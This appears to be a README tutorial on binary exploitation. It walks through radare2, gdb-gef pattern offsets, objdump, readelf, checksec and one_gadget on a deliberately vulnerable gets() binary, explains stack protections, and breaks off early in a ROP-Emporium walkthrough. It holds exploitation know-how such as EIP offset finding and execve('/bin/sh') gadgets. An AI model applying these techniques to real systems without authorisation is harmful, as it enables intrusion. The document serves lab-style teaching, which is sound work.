# PwnLand

This is a archive for resources, tips, associated binaries and other stuffs related to binary exploitation.

# Buffer Overflow

## Tools

The ones I mostly use mostly include the followings:-

#### `radare2`

A reverse engineering framework, I'm pretty sure you've heard of it.
Below is a example of it:-

```r
robin@oracle:~/Pwning$ r2 -AAAA buf
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x08048340]> afl  
0x08048000   20 764  -> 770  fcn.eip
0x080482cc    3 35           sym._init
0x080482fc    1 4            sub.printf_12_2fc
0x08048300    1 6            sym.imp.printf
0x08048310    1 6            sym.imp.gets
0x08048320    1 6            sym.imp.__libc_start_main
0x08048330    1 6            sub.__gmon_start___252_330
0x08048340    1 33           entry0
0x08048370    1 4            sym.__x86.get_pc_thunk.bx
0x08048380    4 43           sym.deregister_tm_clones
0x080483b0    4 53           sym.register_tm_clones
0x080483f0    3 30           sym.__do_global_dtors_aux
0x08048410    4 43   -> 40   entry1.init
0x0804843b    1 15           sym.main
0x0804844a    1 42           sym.bof
0x08048480    4 93           sym.__libc_csu_init
0x080484e0    1 2            sym.__libc_csu_fini
0x080484e4    1 20           sym._fini
[0x08048340]> pdf @main
            ;-- main:
/ (fcn) sym.main 15
|   sym.main ();
|              ; DATA XREF from 0x08048357 (entry0)
|           0x0804843b      55             push ebp
|           0x0804843c      89e5           mov ebp, esp
|           0x0804843e      e807000000     call sym.bof
|           0x08048443      b800000000     mov eax, 0
|           0x08048448      5d             pop ebp
\           0x08048449      c3             ret
[0x08048340]> pdf @sym.bof
/ (fcn) sym.bof 42
|   sym.bof ();
|           ; var int local_80h @ ebp-0x80
|              ; CALL XREF from 0x0804843e (sym.main)
|           0x0804844a      55             push ebp
|           0x0804844b      89e5           mov ebp, esp
|           0x0804844d      83c480         add esp, -0x80
|           0x08048450      8d4580         lea eax, dword [local_80h]
|           0x08048453      50             push eax
|           0x08048454      6800850408     push str.Wanna_Smash__:__p  ; 0x8048500 ; "Wanna Smash!?: %p\n" ; const char * format
|           0x08048459      e8a2feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804845e      83c408         add esp, 8
|           0x08048461      8d4580         lea eax, dword [local_80h]
|           0x08048464      50             push eax                    ; char *s
|           0x08048465      e8a6feffff     call sym.imp.gets           ; char*gets(char *s)
|           0x0804846a      83c404         add esp, 4
|           0x0804846d      b800000000     mov eax, 0
|           0x08048472      c9             leave
\           0x08048473      c3  
```

Arguments explaination:-

* `AAAA` - Analyse all the functions, symbols, sections and other stuffs and make it ready for analysis.
* `afl` - List all the available function calls in binary(dynamic and static)
* `pdf @func_name` - Show disassembly of the function
  
References: - 

* Official Book - <https://radare.gitbooks.io/radare2book/content/>
* Hands on Experience with a walkthrough - <https://tryhackme.com/room/ccradare2> 

#### `gdb`

Good old debugger which will help you in debug the exploit or payload you've created and you might want to take a loo at `gdb-peda`, `gdb-gef` and `pwndbg` all of them are plugin which will be of assistance in the process.

```r
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x080482cc  _init
0x08048300  printf@plt
0x08048310  gets@plt
0x08048320  __libc_start_main@plt
0x08048330  __gmon_start__@plt
0x08048340  _start
0x08048370  __x86.get_pc_thunk.bx
0x08048380  deregister_tm_clones
0x080483b0  register_tm_clones
0x080483f0  __do_global_dtors_aux
0x08048410  frame_dummy
0x0804843b  main
0x0804844a  bof
0x08048480  __libc_csu_init
0x080484e0  __libc_csu_fini
0x080484e4  _fini
gef➤  disas main
Dump of assembler code for function main:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	call   0x804844a <bof>
   0x08048443 <+8>:	mov    eax,0x0
   0x08048448 <+13>:	pop    ebp
   0x08048449 <+14>:	ret    
End of assembler dump.
```

##### pattern create size

This creates a pattern of the size provided which has to be given as an input which will be used to check the register offsets.

```s
robin@oracle:~/Pwning$ gdb-gef -q buf
Reading symbols from buf...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/robin/Pwning/buf 
Wanna Smash!?: 0xffffced0
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x0       
$ecx   : 0xf7fa55c0  →  0xfbad2288
$edx   : 0xf7fa689c  →  0x00000000
$esp   : 0xffffcf58  →  "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
$ebp   : 0x62616168 ("haab"?)
$esi   : 0xf7fa5000  →  0x001d7d6c ("l}"?)
$edi   : 0x0       
$eip   : 0x62616169 ("iaab"?)
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf58│+0x0000: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"	 ← $esp
0xffffcf5c│+0x0004: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffcf60│+0x0008: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
0xffffcf64│+0x000c: "maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabya[...]"
0xffffcf68│+0x0010: "naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0xffffcf6c│+0x0014: "oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0xffffcf70│+0x0018: "paabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0xffffcf74│+0x001c: "qaabraabsaabtaabuaabvaabwaabxaabyaab"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616169
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "buf", stopped, reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x62616169 in ?? ()
gef➤  pattern search jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva
[+] Searching 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva'
[+] Found at offset 136 (big-endian search) 
gef➤  
```

The pattern has been copied from `0xffffcf58│+0x0000: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"	 ← $esp` since we want to find the offset to the stack pointer.

Arguments explaination:-
* `info functions` - List all the functions from the binary.
* `disas func_name` - Show disassembly of function.
  
References:-
* `gdb-gef` - <https://gef.readthedocs.io/en/master/>
* `gdb-peda` - <https://github.com/longld/peda>
* Official docs - <https://www.gnu.org/software/gdb/documentation/>


#### `objdump` 

Goes by name Object Dumper which is helpful in dumping the objects of a binary and could be used to find the address offset of symbols like `puts`, `main` etc.

* View all data/code in every section of an ELF file:
`objdump -D <elf_object>`

```r
robin@oracle:~/Pwning$ objdump -D buf

buf:     file format elf32-i386


Disassembly of section .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Disassembly of section .note.ABI-tag:

-- snip --
```

* View only program code in an ELF file:
`objdump -d <elf_object>`

```s
robin@oracle:~/Pwning$ objdump -d buf

buf:     file format elf32-i386


Disassembly of section .init:

080482cc <_init>:
 80482cc:	53                   	push   %ebx
 80482cd:	83 ec 08             	sub    $0x8,%esp
 80482d0:	e8 9b 00 00 00       	call   8048370 <__x86.get_pc_thunk.bx>
 80482d5:	81 c3 2b 1d 00 00    	add    $0x1d2b,%ebx
 80482db:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 80482e1:	85 c0                	test   %eax,%eax
 80482e3:	74 05                	je     80482ea <_init+0x1e>
 80482e5:	e8 46 00 00 00       	call   8048330 <__gmon_start__@plt>
 80482ea:	83 c4 08             	add    $0x8,%esp
 80482ed:	5b                   	pop    %ebx
 80482ee:	c3                   	ret    

```

* View all symbols:
`objdump -tT <elf_object>`

```s
robin@oracle:~/Pwning$ objdump -tT buf

buf:     file format elf32-i386

SYMBOL TABLE:
08048154 l    d  .interp	00000000              .interp
08048168 l    d  .note.ABI-tag	00000000              .note.ABI-tag
08048188 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
080481ac l    d  .gnu.hash	00000000              .gnu.hash
080481cc l    d  .dynsym	00000000              .dynsym
0804822c l    d  .dynstr	00000000              .dynstr
0804827e l    d  .gnu.version	00000000              .gnu.version
0804828c l    d  .gnu.version_r	00000000              .gnu.version_r
080482ac l    d  .rel.dyn	00000000              .rel.dyn
080482b4 l    d  .rel.plt	00000000              .rel.plt
080482cc l    d  .init	00000000              .init
080482f0 l    d  .plt	00000000              .plt
08048330 l    d  .plt.got	00000000              .plt.got
08048340 l    d  .text	00000000              .text
080484e4 l    d  .fini	00000000              .fini
080484f8 l    d  .rodata	00000000              .rodata
08048514 l    d  .eh_frame_hdr	00000000              .eh_frame_hdr
08048548 l    d  .eh_frame	00000000              .eh_frame
08049f08 l    d  .init_array	00000000              .init_array
```

PS: All of the disassembly is AT&T syntax which can be confusing you can change it to Intel syntax by adding this argument `-M intel`.

#### `pwntools` 

Python library to interact with a binary and for automating things accordingly to save the time, worth the time to learn.

We will take a look into this while pwning a binary.


#### `checksec` 

This is a tool, written in python to check out for the protections on the binary like if the stack is executable or not or is there any canary enabled or not.

```s
robin@oracle:~/Pwning$ checksec buf
[*] '/home/robin/Pwning/buf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

#### `readelf`  

The `readelf` command is one of the most useful tools around for dissecting ELF binaries. It provides every bit of the data specific to ELF necessary for gathering information about an object before reverse engineering it.

* To retrieve a section header table:
`readelf -S <object>`

```s
robin@oracle:~/Pwning$ readelf -S buf
There are 31 section headers, starting at offset 0x1814:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804822c 00022c 000051 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804827e 00027e 00000c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804828c 00028c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482ac 0002ac 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482b4 0002b4 000018 08  AI  5  24  4
  [11] .init             PROGBITS        080482cc 0002cc 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048340 000340 0001a2 00  AX  0   0 16
  [15] .fini             PROGBITS        080484e4 0004e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080484f8 0004f8 00001b 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048514 000514 000034 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048548 000548 0000e0 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [25] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [27] .comment          PROGBITS        00000000 001020 000035 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001709 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001058 000470 10     30  47  4
  [30] .strtab           STRTAB          00000000 0014c8 000241 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

* To retrieve a program header table:
`readelf -l <object>`

```s
robin@oracle:~/Pwning$ readelf -l buf

Elf file type is EXEC (Executable file)
Entry point 0x8048340
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00628 0x00628 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00118 0x0011c RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000514 0x08048514 0x08048514 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
```

* To retrieve a symbol table:
`readelf -s <object>`

```s
robin@oracle:~/Pwning$ readelf -s buf

Symbol table '.dynsym' contains 6 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
     5: 080484fc     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used

Symbol table '.symtab' contains 71 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 08048154     0 SECTION LOCAL  DEFAULT    1 
     2: 08048168     0 SECTION LOCAL  DEFAULT    2 
     3: 08048188     0 SECTION LOCAL  DEFAULT    3 
     4: 080481ac     0 SECTION LOCAL  DEFAULT    4 
     5: 080481cc     0 SECTION LOCAL  DEFAULT    5 
     6: 0804822c     0 SECTION LOCAL  DEFAULT    6 
     7: 0804827e     0 SECTION LOCAL  DEFAULT    7 
     8: 0804828c     0 SECTION LOCAL  DEFAULT    8 
     9: 080482ac     0 SECTION LOCAL  DEFAULT    9 
    10: 080482b4     0 SECTION LOCAL  DEFAULT   10 
    11: 080482cc     0 SECTION LOCAL  DEFAULT   11 
    12: 080482f0     0 SECTION LOCAL  DEFAULT   12 
    13: 08048330     0 SECTION LOCAL  DEFAULT   13 
    14: 08048340     0 SECTION LOCAL  DEFAULT   14 
    15: 080484e4     0 SECTION LOCAL  DEFAULT   15 
    16: 080484f8     0 SECTION LOCAL  DEFAULT   16 
    17: 08048514     0 SECTION LOCAL  DEFAULT   17 
    18: 08048548     0 SECTION LOCAL  DEFAULT   18 
    19: 08049f08     0 SECTION LOCAL  DEFAULT   19 
    20: 08049f0c     0 SECTION LOCAL  DEFAULT   20 
    21: 08049f10     0 SECTION LOCAL  DEFAULT   21 
    22: 08049f14     0 SECTION LOCAL  DEFAULT   22 
    23: 08049ffc     0 SECTION LOCAL  DEFAULT   23 
    24: 0804a000     0 SECTION LOCAL  DEFAULT   24 
    25: 0804a018     0 SECTION LOCAL  DEFAULT   25 
    26: 0804a020     0 SECTION LOCAL  DEFAULT   26 
    27: 00000000     0 SECTION LOCAL  DEFAULT   27 
    28: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    29: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_LIST__
    30: 08048380     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
    31: 080483b0     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
    32: 080483f0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
    33: 0804a020     1 OBJECT  LOCAL  DEFAULT   26 completed.7209
    34: 08049f0c     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fin
    35: 08048410     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
    36: 08049f08     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_
    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS buf.c
    38: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    39: 08048624     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__
    40: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_END__
    41: 00000000     0 FILE    LOCAL  DEFAULT  ABS 
    42: 08049f0c     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end
    43: 08049f14     0 OBJECT  LOCAL  DEFAULT   22 _DYNAMIC
    44: 08049f08     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start
    45: 08048514     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR
    46: 0804a000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_
    47: 080484e0     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini
    48: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab
    49: 08048370     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx
    50: 0804a018     0 NOTYPE  WEAK   DEFAULT   25 data_start
    51: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
    52: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.0
    53: 0804a020     0 NOTYPE  GLOBAL DEFAULT   25 _edata
    54: 080484e4     0 FUNC    GLOBAL DEFAULT   15 _fini
    55: 0804844a    42 FUNC    GLOBAL DEFAULT   14 bof
    56: 0804a018     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    58: 0804a01c     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    59: 080484fc     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
    60: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    61: 08048480    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
    62: 0804a024     0 NOTYPE  GLOBAL DEFAULT   26 _end
    63: 08048340     0 FUNC    GLOBAL DEFAULT   14 _start
    64: 080484f8     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw
    65: 0804a020     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    66: 0804843b    15 FUNC    GLOBAL DEFAULT   14 main
    67: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses
    68: 0804a020     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    69: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
    70: 080482cc     0 FUNC    GLOBAL DEFAULT   11 _init
```


* To retrieve the ELF file header data:
`readelf -e <object>`

```s
robin@oracle:~/Pwning$ readelf -e buf
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048340
  Start of program headers:          52 (bytes into file)
  Start of section headers:          6164 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         31
  Section header string table index: 28

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804822c 00022c 000051 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804827e 00027e 00000c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804828c 00028c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482ac 0002ac 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482b4 0002b4 000018 08  AI  5  24  4
  [11] .init             PROGBITS        080482cc 0002cc 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048340 000340 0001a2 00  AX  0   0 16
  [15] .fini             PROGBITS        080484e4 0004e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080484f8 0004f8 00001b 00   A  0   0  4


-- snip --
```
* To retrieve relocation entries:
`readelf -r <object>`

```s
robin@oracle:~/Pwning$ readelf -r buf

Relocation section '.rel.dyn' at offset 0x2ac contains 1 entry:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b4 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

* To retrieve a dynamic segment:
`readelf -d <object>`

```s
robin@oracle:~/Pwning$ readelf -d buf

Dynamic section at offset 0xf14 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x80482cc
 0x0000000d (FINI)                       0x80484e4
 0x00000019 (INIT_ARRAY)                 0x8049f08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804822c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      81 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   24 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80482b4
 0x00000011 (REL)                        0x80482ac
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x804828c
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x804827e
 0x00000000 (NULL)                       0x0
```

#### `ldd`  

It is used to check the dynamic library which is being used by binary.

```s
robin@oracle:~/Pwning$ ldd buf
	linux-gate.so.1 (0xf7fd4000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dcd000)
	/lib/ld-linux.so.2 (0xf7fd6000)
```
#### `one_gadget`

This is a badass tool for finding a gadget which will be helpful in a ret2libc or can be used in exploit.

Link: <https://github.com/david942j/one_gadget>

Usage: 

```s
robin@oracle:~/Pwning$ one_gadget /lib/i386-linux-gnu/libc.so.6
0x3d0d3 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x3d0d5 execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL

0x3d0d9 execve("/bin/sh", esp+0x3c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x3c] == NULL

0x3d0e0 execve("/bin/sh", esp+0x40, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x40] == NULL

0x67a7f execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x67a80 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

0x137e5e execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL

0x137e5f execl("/bin/sh", [esp])
constraints:
  ebx is the GOT address of libc
  [esp] == NULL
```

#### Ropper and ROPgadget - Gadget finding tools

Both of the tools are very useful in finding gadgets which could be used to perform a Return Oriented Programming Attack.

* [Ropper](https://github.com/sashs/Ropper)
* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)

# Protections on Binaries

Like as we did with `checksec`, we saw there were quite some protections like `CANARY`, `PIE`, `NX ENABLED` and `PIE`, wondering what are they? No need to, I got you covered:-

#### Stack Canary

Stack canaries, named for their analogy to a canary in a coal mine, are used to detect a stack buffer overflow before execution of malicious code can occur. This method works by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer (and thus take control of the process) the canary value must also be overwritten. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack. This technique can greatly increase the difficulty of exploiting a stack buffer overflow because it forces the attacker to gain control of the instruction pointer by some non-traditional means such as corrupting other important variables on the stack. Simpy put, this is a compiler protection which adds a specific value at the very beginning of the program and calculates it at the very end of buffer provided.

#### Non-Executable Stack

This is something you mostly see in almost every binary as of now, this means that whatever buffer you're trying to give it here is not going to work as Stack privilege is now `RW` and now we can't give any buffer which could be pointed to it and used for our own gain, we need something else. ROP or Return Oriented programming, this technique is used to bypass non-executable stack with the help of gadgets(instructions endng with `ret`) and hence using those we get a shell.

#### ASLR and PIE

Abbreviation of Address Space Layout Randomization which randomizes the code address presented in memory and now whatever is there cannot be just known since the random address everytime but implementations typically will not randomize everything; usually the executable itself is loaded at a fixed address and hence even when ASLR (address space layout randomization) is combined with a nonexecutable stack the attacker can use this fixed region of memory, that's where `PIE` - Position Independent Executable comes in place which makes that area randomized.

# Pwntools - Saviour for Exploit Devs

This is a python library and now can be used to interact with binary and automate the process as it has a very vast amount of inbuilt functions, classes which is very useful for finding address, shellcode craft and many other stuffs.

Let's see it in action, taking the binary `split` from ROP-Emporium and pwn it:-


```r
robin@oracle:~/ROP-Emporium$ gdb-gef -q split
Reading symbols from split...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  checksec
[+] checksec for '/home/robin/ROP-Emporium/split'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
gef➤  
```

It has `NX` enabled so we will use Return Oriented Programming technique to get a shell. Let's reverse engineer it first:-

Using `radare2` first:-

```r
robin@oracle:~/ROP-Emporium$ r2 -AAAA split
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x00400650]> afl
0x00400000    2 64           fcn.rip
